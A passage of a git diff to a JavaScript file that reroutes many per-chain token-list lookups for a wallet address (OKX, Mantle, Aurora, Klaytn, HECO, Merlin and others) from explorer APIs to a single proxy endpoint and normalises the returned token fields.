+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //OPBNB API FUNCTION
@@ -5759,63 +6926,12 @@ async function fetchOPBNBTokens(account) {
 
 //OKX API FUNCTION
 async function fetchOKXTokens(account) {
-  const url = `https://www.oklink.com/api/v5/explorer/eth/api?module=account&action=tokentx&address=${account}&startblock=19153000&endblock=19153162&sort=asc`
-  const headers = new Headers({
-      "Ok-Access-Key": okxapikey,
-      "Content-Type": "application/json"
-  })
-  try {
-      const response = await fetch(url, { method: 'GET', headers});
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
-}
+    const url = `https://evms-proxy.vercel.app/proxy/okx?account=${account}`;
 
-//MANTLE API FUNCTION
-async function fetchMANTLETokens(account) {
-  const url = `https://explorer.mantle.xyz/api?module=account&action=tokenlist&address=${account}`
-  const headers = new Headers({ "Ok-Access-Key": okxapikey, "Content-Type": "application/json"})
-  try {
-      const response = await fetch(url, { method: 'GET', headers});
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
-}
-
-//AURORA API FUNCTION
-async function fetchAURORATokens(account) {
-    const url = `https://explorer.mainnet.aurora.dev/api?module=account&action=tokenlist&address=${account}`
     try {
         const response = await fetch(url);
         const data = await response.json();
+
         if (data.status === "1" && data.message === "OK") {
             // Deduplicate tokens based on contract address
             const seen = new Set();
@@ -5824,12 +6940,88 @@ async function fetchAURORATokens(account) {
                 seen.add(tx.contractAddress);
                 return !duplicate;
             });
-            return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(tx => ({
+                tokenSymbol: tx.tokenSymbol,
+                contractAddress: tx.contractAddress,
+                tokenName: tx.tokenName,
+                tokenDecimal: tx.tokenDecimal
+            }));
         } else {
             console.error('Failed to fetch token transactions:', data.result);
         }
     } catch (error) {
         console.error('Error fetching token transactions:', error);
+    }
+    return [];
+}
+
+
+//MANTLE API FUNCTION
+async function fetchMANTLETokens(account) {
+    const url = `https://evms-proxy.vercel.app/proxy/mantle?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
+}
+
+//AURORA API FUNCTION
+async function fetchAURORATokens(account) {
+    const url = `https://evms-proxy.vercel.app/proxy/aurora?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
     }
     return [];
 }
@@ -5861,202 +7053,215 @@ async function fetchCRONOSTokens(account) {
 
 ///KLAYTN API FUNCTION
 async function fetchKLAYTNTokens(account) {
-  const url = `https://klaytnscope.com/api?module=account&action=tokentx&address=${account}&startblock=0&endblock=99999999&sort=asc`
-  try {
-      const response = await fetch(url);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+    const url = `https://evms-proxy.vercel.app/proxy/klaytn?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
+
 
 //PLATON API FUNCTION
 async function fetchPLATONTokens(account) {
-  const url = `https://rpc.particle.network/evm-chain`
-  const options = {
-      chainId: 100,
-      jsonrpc: '2.0',
-      id: 1,
-      method: 'particle_getTokens',
-      params: [account],
-  }
+    const url = `https://evms-proxy.vercel.app/proxy/platon?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-  const auth = {
-      username: particleprojectid,
-      password: particleprojectserverkey,
-  }
-  try {
-      const response = await fetch(url, options, auth);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //HARMONY API FUNCTION
 async function fetchHARMONYTokens(account) {
-  const url = `https://go.getblock.io/${harmonyapikey}/explorer/tx/list/account`
-  const headers = new Headers({ "Content-Type": "application/json"})
-  try {
-      const response = await fetch(url, { method: 'POST', headers: headers, data: {"account": account, "count": 25, "offset": 0}});
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+    const url = `https://evms-proxy.vercel.app/proxy/harmony?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
+
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //HECO API FUNCTION
 async function fetchHECOTokens(account) {
-  const url = `https://rpc.particle.network/evm-chain`
-  const options = {
-      chainId: 128,
-      jsonrpc: '2.0',
-      id: 1,
-      method: 'particle_getTokens',
-      params: [account],
-  }
+    const url = `https://evms-proxy.vercel.app/proxy/heco?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-  const auth = {
-      username: particleprojectid,
-      password: particleprojectserverkey,
-  }
-  try {
-      const response = await fetch(url, options, auth);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //SMARTBCH API FUNCTION
 async function fetchSMARTBCHTokens(account) {
-  const url = `https://rpc.particle.network/evm-chain`
-  const options = {
-      chainId: 10000,
-      jsonrpc: '2.0',
-      id: 1,
-      method: 'particle_getTokens',
-      params: [account],
-  }
+    const url = `https://evms-proxy.vercel.app/proxy/smartbch?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-  const auth = {
-      username: particleprojectid,
-      password: particleprojectserverkey,
-  }
-  try {
-      const response = await fetch(url, options, auth);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
 
 //CONFLUX ESPACE API FUNCTION
 async function fetchCONFLUXTokens(account) {
-  const url = `https://rpc.particle.network/evm-chain`
-  const options = {
-      chainId: 1030,
-      jsonrpc: '2.0',
-      id: 1,
-      method: 'particle_getTokens',
-      params: [account],
-  }
+    const url = `https://evms-proxy.vercel.app/proxy/conflux?account=${account}`
+    try {
+        const response = await fetch(url);
+        const data = await response.json();
 
-  const auth = {
-      username: particleprojectid,
-      password: particleprojectserverkey,
-  }
-  try {
-      const response = await fetch(url, options, auth);
-      const data = await response.json();
-      if (data.status === "1" && data.message === "OK") {
-          // Deduplicate tokens based on contract address
-          const seen = new Set();
-          const uniqueTokens = data.result.filter(tx => {
-              const duplicate = seen.has(tx.contractAddress);
-              seen.add(tx.contractAddress);
-              return !duplicate;
-          });
-          return uniqueTokens.map(tx => ({ tokenSymbol: tx.tokenSymbol, contractAddress: tx.contractAddress }));
-      } else {
-          console.error('Failed to fetch token transactions:', data.result);
-      }
-  } catch (error) {
-      console.error('Error fetching token transactions:', error);
-  }
-  return [];
+        if (data.result && data.result.tokens) {
+            // Extract the tokens array from the response
+            const tokens = data.result.tokens;
+
+            // Deduplicate tokens based on contract address
+            const seen = new Set();
+            const uniqueTokens = tokens.filter(token => {
+                const duplicate = seen.has(token.address);
+                seen.add(token.address);
+                return !duplicate;
+            });
+
+            // Map the tokens to the desired format
+            return uniqueTokens.map(token => ({
+                name: token.name,
+                tokenSymbol: token.symbol,
+                contractAddress: token.address
+            }));
+        } else {
+            console.error('Failed to fetch token data:', data);
+        }
+    } catch (error) {
+        console.error('Error fetching token data:', error);
+    }
+    return [];
 }
+
 
 //MERLIN API FUNCTION
 async function fetchMERLINTokens(account) {
-    const url = `https://scan.merlinchain.io/api?address=${account}&api_key=${merlinapikey}&module=account&action=gettokenlist`
+    const url = `https://scan.merlinchain.io/api?module=account&action=addresstokennftbalance&address=${account}&page=1&offset=100&api_key=${merlinapikey}`
     try {
-        const response = await fetch(url);
+        const response = await axios.get(url);
         const data = await response.json();
         if (data.status === "1" && data.message === "OK") {
             // Deduplicate tokens based on contract address
